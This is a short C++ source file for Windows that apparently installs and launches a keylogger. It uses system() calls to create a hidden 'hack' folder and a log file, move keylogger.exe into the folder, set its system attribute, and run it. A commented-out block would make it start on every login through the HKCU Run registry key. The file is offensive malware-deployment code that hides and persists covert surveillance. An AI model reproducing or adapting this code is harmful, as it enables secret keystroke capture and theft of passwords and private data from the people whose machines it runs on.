#include <Windows.h>
#include <iostream>



int main()
{
	//system("attrib +s a.exe && exit");
	system("C: && mkdir hack && attrib +h hack && cd hack && echo> keylogs.txt");
	system("move keylogger.exe C:/hack/ ");
	system("C: && cd C:/hack/ && attrib +s keylogger.exe");
	system("C: && cd C:/hack/ && keylogger.exe");

    //TCHAR exepath[MAX_PATH];
    //GetModuleFileName(0, exepath, MAX_PATH);
    //HKEY hKey;
    //LONG lnRes = RegOpenKeyEx(
    //    HKEY_CURRENT_USER,
    //    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    //    0, KEY_WRITE,
    //    &hKey
    //);
    //if (ERROR_SUCCESS == lnRes)
    //{
    //    lnRes = RegSetValueEx(hKey,
    //        "YourProgramsName",
    //        0,
    //        REG_SZ,
    //        exepath,
    //        strlen(exepath));
    //}
	return 0;
}